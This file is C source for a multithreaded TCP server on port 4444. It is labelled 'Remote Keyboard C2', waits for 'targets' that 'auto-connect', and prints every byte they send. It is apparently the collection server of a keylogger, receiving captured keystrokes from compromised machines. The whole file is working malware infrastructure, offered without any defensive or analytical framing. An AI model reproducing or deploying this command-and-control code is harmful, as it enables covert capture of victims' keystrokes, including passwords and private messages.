#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <pthread.h>
#include <arpa/inet.h>

#define PORT 4444
#define BUF_SIZE 1

void *handle_client(void *arg) {
    int client_sock = *(int*)arg;
    char buf[BUF_SIZE + 1];
    struct sockaddr_in addr;
    socklen_t len = sizeof(addr);
    getpeername(client_sock, (struct sockaddr*)&addr, &len);
    
    printf("[+] Target connected: %s:%d\n", inet_ntoa(addr.sin_addr), ntohs(addr.sin_port));
    
    while (1) {
        int bytes = recv(client_sock, buf, BUF_SIZE, 0);
        if (bytes <= 0) break;
        buf[bytes] = 0;
        printf("%s", buf);
        fflush(stdout);
    }
    printf("\n[-] Target %s disconnected\n", inet_ntoa(addr.sin_addr));
    close(client_sock);
    free(arg);
    return NULL;
}

int main() {
    int server_sock = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    struct sockaddr_in serv_addr = {0};
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(PORT);
    
    bind(server_sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr));
    listen(server_sock, 5);
    
    printf("=== Remote Keyboard C2 ===\n");
    printf("Listening on 0.0.0.0:%d\n", PORT);
    printf("Targets will auto-connect\n\n");
    
    while (1) {
        int *client_sock = malloc(sizeof(int));
        *client_sock = accept(server_sock, NULL, NULL);
        
        pthread_t thread;
        pthread_create(&thread, NULL, handle_client, client_sock);
        pthread_detach(thread);
    }
    close(server_sock);
    return 0;
}
